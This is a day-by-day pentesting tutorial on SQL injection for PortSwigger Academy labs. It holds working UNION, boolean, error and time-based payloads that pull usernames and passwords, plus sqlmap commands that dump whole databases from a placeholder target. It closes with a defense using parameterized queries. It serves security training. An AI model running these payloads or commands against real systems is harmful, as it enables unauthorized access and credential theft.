# 100-Day Pentesting Challenge
## Day 21: SQL Injection — Practitioner (UNION & Blind SQLi)

> **Platform:** PortSwigger Web Security Academy (PSW) &nbsp;|&nbsp; **Difficulty:** Medium &nbsp;|&nbsp; **Time:** 2+ Hours

---

## What You'll Learn Today

| Topic | Why It Matters |
|---|---|
| Advanced UNION Attacks | Extract data from multiple database tables |
| Blind SQL Injection | Exploit applications without visible query results |
| Time-Based SQL Injection | Use response delays to infer data |
| Out-of-Band SQL Injection | Exfiltrate data through external channels |
| SQLMap | Automate SQL Injection testing and enumeration |

> Advanced SQL Injection techniques are used when applications suppress database errors and query output. Learning these methods prepares you for realistic lab environments. :contentReference[oaicite:0]{index=0}

---

## PortSwigger Labs

| # | Lab | Focus |
|---|---|---|
| 1 | UNION Attack – Retrieve Data | Full UNION extraction |
| 2 | Multiple Values in One Column | Column concatenation |
| 3 | Blind SQLi – Conditional Responses | Boolean-based SQLi |
| 4 | Blind SQLi – Conditional Errors | Error-based SQLi |
| 5 | Blind SQLi – Time Delays | Time-based SQLi |
| 6 | Blind SQLi – Information Retrieval | Time-based extraction |
| 7 | Blind SQLi – Out-of-Band | DNS-based exfiltration |

---

## 2-Hour Schedule

| Time | Activity |
|---|---|
| 0:00 – 0:15 | Review advanced UNION attacks |
| 0:15 – 0:40 | Complete Labs 1 & 2 |
| 0:40 – 1:00 | Learn Boolean Blind SQLi |
| 1:00 – 1:20 | Complete Lab 3 |
| 1:20 – 1:40 | Study Error, Time-Based and OOB SQLi |
| 1:40 – 2:00 | Complete remaining labs and document notes |

---

## Must-Know Concepts

### 1. Advanced UNION Attack

Typical workflow:

```text
Find Column Count

↓

Find Text Columns

↓

Enumerate Tables

↓

Enumerate Columns

↓

Extract Sensitive Data
```

---

### Example Workflow

Determine text columns:

```sql
' UNION SELECT 'A','B'--
```

Enumerate tables:

```sql
' UNION SELECT table_name,NULL
FROM information_schema.tables--
```

Enumerate columns:

```sql
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users'--
```

Extract credentials:

```sql
' UNION SELECT username,password
FROM users--
```

---

### 2. Multiple Values in One Column

Sometimes only one column accepts text values.

Examples:

MySQL

```sql
' UNION SELECT NULL,
CONCAT(username,':',password)
FROM users--
```

Oracle / PostgreSQL

```sql
' UNION SELECT NULL,
username||':'||password
FROM users--
```

Microsoft SQL Server

```sql
' UNION SELECT NULL,
username+':'+password
FROM users--
```

---

Example response:

```text
administrator:password123

carlos:qwerty

wiener:test123
```

---

### Burp Workflow

```text
Capture Request

↓

Send to Repeater

↓

Modify Payload

↓

Analyze Response

↓

Document Findings
```

---

### Key Takeaways

- UNION attacks require matching column counts.
- Enumerate tables before extracting data.
- Concatenation helps when only one text column exists.
- Burp Repeater simplifies manual testing.
- Record every successful payload for future reference.

---

### 3. Blind Boolean-Based SQL Injection

Blind SQL Injection occurs when the application does not display database errors or query results.

Instead, you determine whether a condition is **TRUE** or **FALSE** by observing changes in the application's behavior.

---

### Typical Workflow

```text
Capture Request

↓

Identify Injection Point

↓

Test TRUE Condition

↓

Test FALSE Condition

↓

Observe Difference

↓

Extract Data
```

---

### Confirming Blind SQLi

TRUE condition:

```sql
' AND 1=1--
```

FALSE condition:

```sql
' AND 1=2--
```

If the application's response changes between the two requests, a Blind SQL Injection vulnerability may exist.

---

### Table Enumeration

Verify the existence of the `users` table:

```sql
' AND (SELECT 'x'
FROM users
LIMIT 1)='x'--
```

---

### Verify Administrator User

```sql
' AND (
SELECT 'x'
FROM users
WHERE username='administrator'
)='x'--
```

---

### Password Length Discovery

Determine password length:

```sql
' AND (
SELECT LENGTH(password)
FROM users
WHERE username='administrator'
)=20--
```

Or use greater-than checks:

```sql
' AND (
SELECT LENGTH(password)
FROM users
WHERE username='administrator'
)>10--
```

---

### Character Extraction

Extract the first character:

```sql
' AND (
SELECT SUBSTRING(password,1,1)
FROM users
WHERE username='administrator'
)='a'--
```

Extract the second character:

```sql
' AND (
SELECT SUBSTRING(password,2,1)
FROM users
WHERE username='administrator'
)='b'--
```

Repeat until the full value is identified.

---

### Using Burp Intruder

Workflow:

```text
Send Request to Intruder

↓

Mark Character Position

↓

Load Character Set

↓

Start Attack

↓

Identify Matching Response

↓

Repeat for Next Character
```

---

## 4. Conditional Error-Based SQL Injection

Some applications suppress query output but return different responses when database errors occur.

Example:

```sql
CASE WHEN condition
THEN error
ELSE normal
END
```

---

### Example

```sql
CASE WHEN (1=1)
THEN divide_by_zero
ELSE normal
END
```

If the server generates an error only when the condition is true, you can extract information one character at a time.

---

### Indicators

- HTTP 500 response
- Database exception
- Different error page
- Different response length

---

## 5. Time-Based Blind SQL Injection

Time-Based SQL Injection uses response delays instead of visible output.

TRUE condition:

```text
Server waits several seconds.
```

FALSE condition:

```text
Server responds immediately.
```

---

### Common Delay Functions

MySQL

```sql
SLEEP(5)
```

Microsoft SQL Server

```sql
WAITFOR DELAY '0:0:5'
```

PostgreSQL

```sql
pg_sleep(5)
```

Oracle

```sql
DBMS_PIPE.RECEIVE_MESSAGE('A',5)
```

---

### Example

```sql
' AND IF(1=1,SLEEP(5),0)--
```

If the response is delayed, the tested condition is true.

---

### Character Extraction

```sql
CASE WHEN (
SUBSTRING(password,1,1)='a'
)
THEN SLEEP(5)
ELSE 0
END
```

Observe the response time to determine whether the guess is correct.

---

## 6. Out-of-Band (OOB) SQL Injection

Out-of-Band SQL Injection retrieves information through external communication channels.

Typical methods:

- DNS requests
- HTTP requests

This technique is useful when direct responses and timing attacks are ineffective.

---

### Workflow

```text
Inject Payload

↓

Database Generates External Request

↓

Receive DNS/HTTP Callback

↓

Extract Information
```

---

### Typical Scenarios

- DNS-based exfiltration
- HTTP callbacks
- External logging servers

---

### Key Takeaways

- Blind SQL Injection relies on application behavior rather than visible query results.
- Boolean-based techniques compare TRUE and FALSE responses.
- Error-based SQLi uses database exceptions as an information channel.
- Time-based SQLi relies on measurable response delays.
- Out-of-Band SQLi uses external communication when other methods are unavailable.

---

## 7. SQLMap

SQLMap automates SQL Injection detection, database fingerprinting, enumeration and data extraction.

It should be used only in authorized labs and penetration tests.

---

### Basic Usage

Test a GET parameter:

```bash
sqlmap -u "http://target.com/?id=1" --dbs
```

Test a POST request:

```bash
sqlmap -u "http://target.com/login" \
--data="username=admin&password=test" \
--dbs
```

Test a Cookie parameter:

```bash
sqlmap -u "http://target.com/" \
--cookie="TrackingId=xyz*" \
--level=5 \
--risk=3
```

Specify the vulnerable parameter:

```bash
sqlmap -u "http://target.com/?id=1&cat=2" \
-p id \
--dbs
```

---

### Enumeration Commands

List databases:

```bash
sqlmap -u "http://target.com/?id=1" --dbs
```

List tables:

```bash
sqlmap -u "http://target.com/?id=1" \
-D database_name \
--tables
```

List columns:

```bash
sqlmap -u "http://target.com/?id=1" \
-D database_name \
-T users \
--columns
```

Dump table contents:

```bash
sqlmap -u "http://target.com/?id=1" \
-D database_name \
-T users \
--dump
```

Dump everything:

```bash
sqlmap -u "http://target.com/?id=1" \
--dump-all
```

---

### Useful SQLMap Options

Current database user:

```bash
sqlmap --current-user
```

Check DBA privileges:

```bash
sqlmap --is-dba
```

Use a Burp request:

```bash
sqlmap -r request.txt --dbs
```

Specify technique:

```bash
sqlmap --technique=BEU
```

Time-based only:

```bash
sqlmap --technique=T
```

Increase testing level:

```bash
sqlmap --level=5 --risk=3
```

Proxy traffic through Burp:

```bash
sqlmap --proxy=http://127.0.0.1:8080
```

---

## 8. Manual Blind SQLi Extraction

Typical workflow:

```text
Confirm Blind SQLi

↓

Determine Password Length

↓

Extract Characters

↓

Reconstruct Password

↓

Authenticate

↓

Document Findings
```

Manual extraction usually consists of:

- TRUE/FALSE testing
- Character-by-character extraction
- Password reconstruction
- Verification

Automation can later be performed using Burp Intruder or SQLMap.

---

## 9. SQL Injection Prevention

The most effective defense is parameterized queries (prepared statements).

Unsafe example:

```python
query = "SELECT * FROM users WHERE username='" + username + "'"
```

Safe example:

```python
query = "SELECT * FROM users WHERE username=?"
cursor.execute(query, (username,))
```

Prepared statements prevent user input from being interpreted as SQL syntax.

---

## Quick Reference Cheatsheet

```text
UNION

ORDER BY

UNION SELECT NULL

information_schema.tables

information_schema.columns

Blind Boolean

AND 1=1

AND 1=2

SUBSTRING()

LENGTH()

Blind Time

MySQL

SLEEP()

PostgreSQL

pg_sleep()

MSSQL

WAITFOR DELAY

Oracle

DBMS_PIPE.RECEIVE_MESSAGE()

SQLMap

--dbs

--tables

--columns

--dump

-r request.txt

--technique

--level

--risk

Workflow

Find Columns

↓

Find Text Columns

↓

Find Tables

↓

Find Columns

↓

Extract Data

↓

Document
```

---

## Day 21 Submission Task

```text
Complete all assigned PortSwigger SQL Injection labs.

Practice:

• Advanced UNION attacks
• Boolean-based Blind SQL Injection
• Error-based Blind SQL Injection
• Time-based Blind SQL Injection
• SQLMap enumeration

Capture requests using Burp Suite.

Document:

• Payloads
• Requests
• Responses
• Database identified
• Tables discovered
• Columns discovered
• Lessons learned

Save everything in Markdown.

Push to:

100-days-pentest/
└── Day-21/

Include:

• PortSwigger completion screenshots
• Burp Repeater screenshots
• SQLMap output
• Notes
```

---

### Bonus Challenge

```text
Deploy a deliberately vulnerable SQL Injection lab.

Perform:

• UNION enumeration
• Boolean Blind SQLi
• Time-based Blind SQLi
• SQLMap enumeration

Record:

• Payload
• Request
• Response
• Observation
• Result

Summarize your findings in a Markdown report.
```

---

> **End of Day 21**

**Next Up:** **Day 22 — Cross-Site Scripting (XSS): Reflected XSS Fundamentals**

---
